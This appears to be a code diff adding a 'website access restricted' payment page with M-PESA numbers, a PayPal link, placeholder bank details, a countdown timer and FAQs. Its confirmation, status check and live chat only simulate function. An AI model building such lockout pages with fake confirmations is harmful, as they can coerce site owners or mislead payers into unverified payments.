+          </div>
+          <div class="payment-method" onclick="openPaymentModal('bank')">
+            <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" alt="Bank Transfer">
+            <span>Bank</span>
+          </div>
+        </div>
+        
+        <div id="payment-confirmation" class="payment-confirmation">
+          <h3>Confirm Your Payment</h3>
+          <p>Please enter your payment details below:</p>
+          <input type="text" placeholder="M-PESA Transaction ID or Reference" required>
+          <input type="text" placeholder="Phone Number Used" required>
+          <button onclick="confirmPayment()">Confirm Payment</button>
+        </div>
+      </div>
+      
+      <p>👨‍⚕️ Once payment is confirmed, website access will be restored immediately.<br>
+      For any inquiries or payment confirmation, please contact our support team.</p>
+      
+      <button class="btn" onclick="openContactModal()">Contact Support</button>
+    </div>
+    
+    <!-- Payment Modal -->
+    <div id="payment-modal" class="modal">
+      <div class="modal-content">
+        <span class="close-modal" onclick="closePaymentModal()">&times;</span>
+        <h3 class="support-title" id="payment-modal-title">Make Payment</h3>
+        
+        <div id="mpesa-payment-content" style="display: none;">
+          <p>Please send payment via M-PESA to:</p>
+          <div class="mpesa-container">
+            <div class="mpesa-number">0769106047</div>
+            <button class="copy-btn" onclick="copyToClipboard('0769106047')">Copy</button>
+          </div>
+          <div class="mpesa-container">
+            <div class="mpesa-number">0112934576</div>
+            <button class="copy-btn" onclick="copyToClipboard('0112934576')">Copy</button>
+          </div>
+          <div class="copy-success" id="copy-success">Number copied to clipboard!</div>
+          
+          <div style="margin-top: 20px;">
+            <button class="btn" onclick="showConfirmation()">I've Made the Payment</button>
+          </div>
+        </div>
+        
+        <div id="card-payment-content" style="display: none;">
+          <form id="card-form">
+          
+            <input type="text" class="phone-input" placeholder="Paypal Secure Payment" disabled>
+            <button type="submit" class="btn">Pay Now</button>
+          </form>
+        </div>
+        
+        <div id="bank-payment-content" style="display: none;">
+          <div style="background: #f8f9fa; padding: 15px; border-radius: 10px; margin: 15px 0;">
+            <p><strong>Bank Details:</strong></p>
+            <p>Bank Name: Example Bank</p>
+            <p>Account Name: Website Services</p>
+            <p>Account Number: 1234567890</p>
+            <p>Branch Code: 001</p>
+          </div>
+          <button class="btn" onclick="showConfirmation()">I've Made the Bank Transfer</button>
+        </div>
+        
+        <div id="payment-confirmation" class="payment-confirmation">
+          <h3>Confirm Your Payment</h3>
+          <p>Please enter your payment details below:</p>
+          <input type="text" placeholder="M-PESA Transaction ID or Reference" required>
+          <input type="text" placeholder="Phone Number Used" required>
+          <button onclick="confirmPayment()">Confirm Payment</button>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Contact Support Modal -->
+    <div id="contact-modal" class="modal">
+      <div class="modal-content">
+        <span class="close-modal" onclick="closeContactModal()">&times;</span>
+        <h3 class="support-title">How Can We Help You?</h3>
+        
+        <div class="tab-container">
+          <div class="tab-buttons">
+            <button class="tab-btn active" onclick="openTab(event, 'contact-tab')">Contact Us</button>
+            <button class="tab-btn" onclick="openTab(event, 'faq-tab')">FAQs</button>
+            <button class="tab-btn" onclick="openTab(event, 'status-tab')">Payment Status</button>
+          </div>
+          
+          <div id="contact-tab" class="tab-content active">
+            <p>Choose your preferred contact method:</p>
+            <div class="contact-options">
+              <a href="https://wa.me/254769106047" class="contact-option">
+                <i class="fab fa-whatsapp" style="color: #25D366;"></i>
+                WhatsApp Support
+              </a>
+              <a href="tel:+254769106047" class="contact-option">
+                <i class="fas fa-phone" style="color: #007bff;"></i>
+                Call Support
+              </a>
+              <a href="mailto:support@example.com" class="contact-option">
+                <i class="fas fa-envelope" style="color: #dc3545;"></i>
+                Email Support
+              </a>
+              <a href="#" class="contact-option" onclick="openLiveChat()">
+                <i class="fas fa-comments" style="color: #17a2b8;"></i>
+                Live Chat
+              </a>
+            </div>
+          </div>
+          
+          <div id="faq-tab" class="tab-content">
+            <div style="text-align: left;">
+              <details>
+                <summary>Why is my website access restricted?</summary>
+                <p>Your website access has been restricted due to an outstanding payment. Once the payment is made, access will be restored immediately.</p>
+              </details>
+              <details>
+                <summary>How long does it take to restore access?</summary>
+                <p>Website access is typically restored within 5-15 minutes after payment confirmation.</p>
+              </details>
+              <details>
+                <summary>What payment methods do you accept?</summary>
+                <p>We accept M-PESA, credit/debit cards, and bank transfers.</p>
+              </details>
+              <details>
+                <summary>I've made the payment but still can't access the website</summary>
+                <p>Please contact our support team with your payment details and we'll resolve this issue immediately.</p>
+              </details>
+            </div>
+          </div>
+          
+          <div id="status-tab" class="tab-content">
+            <p>Check your payment status:</p>
+            <input type="text" class="phone-input" placeholder="Enter Transaction ID" required>
+            <button class="btn" style="margin-top: 15px;">Check Status</button>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Live Chat Container -->
+    <div id="live-chat-container" style="display: none; position: fixed; bottom: 20px; right: 20px; width: 300px; height: 400px; background: white; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.2); z-index: 1000;">
+      <div style="background: linear-gradient(90deg,#182c59,#ff1cac); padding: 10px; border-radius: 10px 10px 0 0; color: white; display: flex; justify-content: space-between; align-items: center;">
+        <span>Live Support</span>
+        <span onclick="closeLiveChat()" style="cursor: pointer;">&times;</span>
+      </div>
+      <div style="height: 310px; padding: 10px; overflow-y: auto; background: #f9f9f9;">
+        <div style="background: #e6e6e6; padding: 8px; border-radius: 10px; margin-bottom: 10px; max-width: 80%;">
+          <strong>Support Agent:</strong> Hello! How can I help you today?
+        </div>
+      </div>
+      <div style="display: flex; padding: 10px; background: white; border-top: 1px solid #eee; border-radius: 0 0 10px 10px;">
+        <input type="text" placeholder="Type your message..." style="flex: 1; padding: 8px; border: 1px solid #ddd; border-radius: 5px; margin-right: 5px;">
+        <button style="background: linear-gradient(90deg,#182c59,#ff1cac); color: white; border: none; border-radius: 5px; padding: 0 15px; cursor: pointer;">Send</button>
+      </div>
+    </div>
+    
+    <script>
+      // Initialize countdown timer
+      function startCountdown() {
+        let hours = 23;
+        let minutes = 59;
+        let seconds = 59;
+        
+        const countdownInterval = setInterval(function() {
+          if (seconds > 0) {
+            seconds--;
+          } else if (minutes > 0) {
+            minutes--;
+            seconds = 59;
+          } else if (hours > 0) {
+            hours--;
+            minutes = 59;
+            seconds = 59;
+          } else {
+            clearInterval(countdownInterval);
+          }
+          
+          document.getElementById('countdown').textContent = 
+            (hours < 10 ? '0' + hours : hours) + ':' +
+            (minutes < 10 ? '0' + minutes : minutes) + ':' +
+            (seconds < 10 ? '0' + seconds : seconds);
+        }, 1000);
+      }
+      
+      // Payment modal functionality
+      function openPaymentModal(paymentType) {
+        const modal = document.getElementById('payment-modal');
+        modal.style.display = 'block';
+        
+        // Hide all payment content first
+        document.getElementById('mpesa-payment-content').style.display = 'none';
+        document.getElementById('card-payment-content').style.display = 'none';
+        document.getElementById('bank-payment-content').style.display = 'none';
+        document.getElementById('payment-confirmation').style.display = 'none';
+        
+        // Show the selected payment content
+        if (paymentType === 'mpesa') {
+          document.getElementById('payment-modal-title').textContent = 'M-PESA Payment';
+          document.getElementById('mpesa-payment-content').style.display = 'block';
+        } else if (paymentType === 'card') {
+          document.getElementById('payment-modal-title').textContent = 'Card Payment';
+          document.getElementById('card-payment-content').style.display = 'block';
+        } else if (paymentType === 'bank') {
+          document.getElementById('payment-modal-title').textContent = 'Bank Transfer';
+          document.getElementById('bank-payment-content').style.display = 'block';
+        }
+      }
+      
+      function closePaymentModal() {
+        document.getElementById('payment-modal').style.display = 'none';
+      }
+      
+      // Contact modal functionality
+      function openContactModal() {
+        document.getElementById('contact-modal').style.display = 'block';
+      }
+      
+      function closeContactModal() {
+        document.getElementById('contact-modal').style.display = 'none';
+      }
+      
+      // Copy to clipboard functionality
+      function copyToClipboard(text) {
+        navigator.clipboard.writeText(text)
+          .then(() => {
+            const copySuccess = document.getElementById('copy-success');
+            copySuccess.style.display = 'block';
+            setTimeout(() => {
+              copySuccess.style.display = 'none';
+            }, 2000);
+          })
+          .catch(err => {
+            console.error('Failed to copy text: ', err);
+          });
+      }
+      
+      // Show payment confirmation form
+      function showConfirmation() {
+        document.getElementById('payment-confirmation').style.display = 'block';
+      }
+      
+      // Simulate payment confirmation
+      function confirmPayment() {
+        alert('Thank you! Your payment is being processed. We will restore your access shortly.');
+        document.getElementById('payment-confirmation').style.display = 'none';
+        closePaymentModal();
+      }
+      
+      // Tab functionality
+      function openTab(evt, tabName) {
+        const tabContents = document.getElementsByClassName('tab-content');
+        for (let i = 0; i < tabContents.length; i++) {
+          tabContents[i].classList.remove('active');
+        }
+        
+        const tabButtons = document.getElementsByClassName('tab-btn');
+        for (let i = 0; i < tabButtons.length; i++) {
+          tabButtons[i].classList.remove('active');
+        }
+        
+        document.getElementById(tabName).classList.add('active');
+        evt.currentTarget.classList.add('active');
+      }
+      
+      // Live chat functionality
+      function openLiveChat() {
+        document.getElementById('live-chat-container').style.display = 'block';
+        closeContactModal();
+      }
+      
+      function closeLiveChat() {
+        document.getElementById('live-chat-container').style.display = 'none';
+      }
+      
+      // Close modal when clicking outside
+      window.onclick = function(event) {
+        const contactModal = document.getElementById('contact-modal');
+        const paymentModal = document.getElementById('payment-modal');
+        if (event.target == contactModal) {
+          contactModal.style.display = 'none';
+        }
+        if (event.target == paymentModal) {
+          paymentModal.style.display = 'none';
+        }
+      }
+      
+      // Add form event listeners
+      document.getElementById('card-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        window.location.href = 'https://www.paypal.com/ncp/payment/5APZ4QTAHH3NA'; // Redirect to PayPal
+        alert('Thank you! Your card payment is being processed.');
+      });
+      
+      // Initialize on page load
+      window.onload = function() {
+        startCountdown();
+      };
+    </script>
+  </body>
+</html>
